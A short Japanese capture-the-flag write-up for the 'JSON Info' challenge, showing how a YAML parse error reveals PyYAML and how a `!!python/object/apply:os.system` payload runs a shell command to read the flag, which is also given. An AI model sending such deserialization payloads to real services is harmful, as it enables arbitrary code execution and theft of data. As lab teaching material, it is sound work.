# JSON Info

## 手順
説明によればJSON文字列をnetcat等で送信するとそれをパースしてくれるプログラムが動いている。実際にJSON文字列を送るとアイテム数を表示するプログラムが動いているように見える。  
ここでJSONとして不正な形式を送ってみる。`{hoge:fuga}`というように不正なJSONを送り込むと
```
There was an error: while scanning a plain scalar
  in "<stdin>", line 1, column 2
found unexpected ':'
  in "<stdin>", line 1, column 5
Please check http://pyyaml.org/wiki/YAMLColonInFlowContext for details.
```

このようなエラーが表示された。このエラーよりPyYAMLを使ってパースしていると考えられる。  
PyYAML Vulnerabilitiesのようなワードで検索すると任意コード実行の脆弱性があることがわかる(下記参考文献)。  
よってPayloadとして`!!python/object/apply:os.system ["cat flag.txt"]`を送り込むとフラグが表示される。

## Flag
hsctf{JS0N_or_Y4ML}

## 参考文献
https://www.talosintelligence.com/reports/TALOS-2017-0305
